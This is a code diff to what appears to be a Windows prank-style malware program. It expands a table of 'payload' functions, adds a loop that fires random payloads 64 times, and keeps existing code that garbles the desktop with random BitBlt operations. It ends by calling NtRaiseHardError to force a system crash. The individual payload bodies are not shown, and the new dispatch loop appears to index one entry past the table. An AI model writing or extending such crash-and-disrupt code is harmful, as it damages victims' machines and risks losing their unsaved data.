@@ -1,5 +1,3 @@
-#pragma comment(lib, "Winmm.lib")
-
 #ifdef UNICODE
 #undef UNICODE
 #define MULTIBYTE
@@ -75,7 +73,28 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         p8,
         p9,
         p10,
-        p11
+        p11,
+        p12,
+        p13,
+        p14,
+        p15,
+        p16,
+        p17,
+        p18,
+        p19,
+        p20,
+        p21,
+        p22,
+        p23,
+        p24,
+        p25,
+        p26,
+        p27,
+        p28,
+        p29,
+        p30,
+        p31,
+        p32
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
     
     DWORD zero = 0;
@@ -232,6 +251,109 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         BitBlt(desk, rand() % w, rand() % h, rand() % w, rand() % h, desk, rand() % w, rand() % h, SRCERASE);
         Sleep(50);
     }
+
+    fori(64) {
+        switch(rand() % 32) {
+            case 1:
+                payloads[1]();
+                break;
+            case 2:
+                payloads[2]();
+                break;
+            case 3:
+                payloads[3]();
+                break;
+            case 4:
+                payloads[4]();
+                break;
+            case 5:
+                payloads[5]();
+                break;
+            case 6:
+                payloads[6]();
+                break;
+            case 7:
+                payloads[7]();
+                break;
+            case 8:
+                payloads[8]();
+                break;
+            case 9:
+                payloads[9]();
+                break;
+            case 10:
+                payloads[10]();
+                break;
+            case 11:
+                payloads[11]();
+                break;
+            case 12:
+                payloads[12]();
+                break;
+            case 13:
+                payloads[13]();
+                break;
+            case 14:
+                payloads[14]();
+                break;
+            case 15:
+                payloads[15]();
+                break;
+            case 16:
+                payloads[16]();
+                break;
+            case 17:
+                payloads[17]();
+                break;
+            case 18:
+                payloads[18]();
+                break;
+            case 19:
+                payloads[19]();
+                break;
+            case 20:
+                payloads[20]();
+                break;
+            case 21:
+                payloads[21]();
+                break;
+            case 22:
+                payloads[22]();
+                break;
+            case 23:
+                payloads[23]();
+                break;
+            case 24:
+                payloads[24]();
+                break;
+            case 25:
+                payloads[25]();
+                break;
+            case 26:
+                payloads[26]();
+                break;
+            case 27:
+                payloads[27]();
+                break;
+            case 28:
+                payloads[28]();
+                break;
+            case 29:
+                payloads[29]();
+                break;
+            case 30:
+                payloads[30]();
+                break;
+            case 31:
+                payloads[31]();
+                break;
+            case 32:
+                payloads[32]();
+                break;
+            default:
+                break;
+        }
+    }
     
 
     ReleaseDC(NULL, desk);
@@ -253,4 +375,4 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     NtRaiseHardError(0xDEADDEAD, NULL, NULL, NULL, 6, &ulResponse);
     FreeLibrary(ntdll);
     return 0;
-}
+}   
